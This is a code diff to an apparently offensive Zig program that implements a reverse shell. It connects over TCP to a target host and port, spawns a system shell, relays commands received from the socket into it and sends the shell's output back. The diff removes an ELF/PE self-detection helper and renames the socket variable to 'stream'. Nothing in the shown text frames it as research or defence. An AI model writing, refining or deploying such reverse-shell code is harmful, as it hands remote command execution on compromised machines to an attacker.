@@ -1,34 +1,6 @@
 const std = @import("std");
 const builtin = @import("builtin");
 
-// Function to detect if the current executable is ELF or PE
-fn detectExecutableFormat(allocator: std.mem.Allocator) !enum { ELF, PE, Unknown } {
-    // Get the path to our own executable
-    const exe_path = try std.fs.selfExePathAlloc(allocator);
-    defer allocator.free(exe_path);
-
-    // Open and read the first few bytes
-    const file = std.fs.cwd().openFile(exe_path, .{}) catch return .Unknown;
-    defer file.close();
-
-    var header: [64]u8 = undefined;
-    const bytes_read = file.readAll(&header) catch return .Unknown;
-
-    if (bytes_read < 4) return .Unknown;
-
-    // Check for ELF magic bytes (0x7f 'E' 'L' 'F')
-    if (header[0] == 0x7f and header[1] == 'E' and header[2] == 'L' and header[3] == 'F') {
-        return .ELF;
-    }
-
-    // Check for PE magic bytes ('M' 'Z')
-    if (header[0] == 'M' and header[1] == 'Z') {
-        return .PE;
-    }
-
-    return .Unknown;
-}
-
 pub fn main() !void {
     var gpa = std.heap.GeneralPurposeAllocator(.{}){};
     defer _ = gpa.deinit();
@@ -66,11 +38,11 @@ pub fn main() !void {
 
     const address_list = try std.net.getAddressList(allocator, target_hostname, target_port);
     defer address_list.deinit();
-    const socket = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
+    const stream = std.net.tcpConnectToAddress(address_list.addrs[0]) catch {
         std.debug.print("[-] Host seems down. Cannot connect to the host.\n", .{});
         return;
     };
-    defer socket.close();
+    defer stream.close();
 
     var process = std.process.Child.init(shell, allocator);
     process.stdin_behavior = .Pipe;
@@ -83,7 +55,7 @@ pub fn main() !void {
 
     while (true) {
         // Read command from socket
-        const bytes_read = socket.read(&buffer) catch break;
+        const bytes_read = stream.read(&buffer) catch break;
         if (bytes_read == 0) break;
 
         // Send command to process
@@ -95,13 +67,13 @@ pub fn main() !void {
         // Read output once with reasonable timeout
         if (process.stdout.?.read(&buffer)) |output_len| {
             if (output_len > 0) {
-                _ = socket.write(buffer[0..output_len]) catch break;
+                _ = stream.write(buffer[0..output_len]) catch break;
             }
         } else |_| {
             // If stdout fails, try stderr
             if (process.stderr.?.read(&buffer)) |error_len| {
                 if (error_len > 0) {
-                    _ = socket.write(buffer[0..error_len]) catch break;
+                    _ = stream.write(buffer[0..error_len]) catch break;
                 }
             } else |_| {}
         }
